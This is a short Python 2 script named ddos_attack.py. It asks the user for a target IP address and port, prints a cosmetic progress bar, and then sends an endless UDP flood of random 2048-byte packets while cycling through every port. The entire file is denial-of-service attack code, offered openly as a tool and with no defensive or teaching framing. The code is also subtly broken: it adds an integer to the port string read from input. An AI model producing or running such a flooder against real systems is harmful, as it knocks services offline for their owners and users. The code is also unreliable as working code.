#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @File  : ddos_attack.py
# @Author: lucas
# @Date  : 10/5/18
# @Desc  :


import os
import time
import socket
import random
from datetime import datetime
from pprint import pprint

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


def do_clear():
    os.system('clear')
    os.system('figlet DDos Attack')  # need to install figlet


def show_process():
    sleep_time = 1
    pprint("[                    ] 0% ")
    time.sleep(sleep_time)
    pprint("[=====               ] 25%")
    time.sleep(sleep_time)
    pprint("[==========          ] 50%")
    time.sleep(sleep_time)
    pprint("[===============     ] 75%")
    time.sleep(sleep_time)
    pprint("[====================] 100%")
    time.sleep(sleep_time)


def start_ddos():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(2048)

    do_clear()

    ip = raw_input('please input target ip:')
    port = raw_input('please input port :')

    do_clear()

    show_process()

    sent = 0

    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        pprint("Sent %s packet to %s through port:%s" % (sent, ip, port))
        if port == 65534:
            port = 1


def run():
    start_ddos()


if __name__ == '__main__':
    run()
